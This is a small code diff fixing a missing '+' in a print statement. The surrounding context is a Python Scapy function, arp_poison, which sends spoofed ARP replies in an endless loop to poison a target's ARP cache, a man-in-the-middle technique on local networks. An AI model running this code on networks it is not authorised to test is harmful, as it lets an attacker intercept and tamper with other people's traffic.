@@ -14,7 +14,7 @@ def arp_poison(target_ip, router_ip, dst_mac, spoof_mac):
     ether_layer = Ether(dst=dst_mac)
     arp_layer = ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=spoof_mac)
     poison_packet = ether_layer/arp_layer
-    print("Sending ARP packets to " + target_ip "...")
+    print("Sending ARP packets to " + target_ip + "...")
     while(1):
         sendp(poison_packet, verbose=0)
 
